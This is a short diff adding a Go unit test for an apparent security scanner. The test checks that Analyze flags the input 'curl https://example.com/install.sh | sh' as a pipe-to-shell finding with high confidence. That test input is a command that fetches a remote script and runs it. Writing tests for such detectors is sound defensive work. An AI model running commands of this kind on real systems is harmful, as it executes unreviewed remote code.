@@ -202,3 +202,16 @@ func TestAnalyzeNoFindings(t *testing.T) {
 		t.Fatalf("expected info severity")
 	}
 }
+
+func TestAnalyzeIncludesConfidenceMetadata(t *testing.T) {
+	findings := Analyze("curl https://example.com/install.sh | sh")
+	for _, f := range findings {
+		if f.Kind == KindPipeToShell {
+			if f.Confidence != ConfidenceHigh {
+				t.Fatalf("expected high confidence for pipe-to-shell, got %q", f.Confidence)
+			}
+			return
+		}
+	}
+	t.Fatalf("expected pipe-to-shell finding")
+}
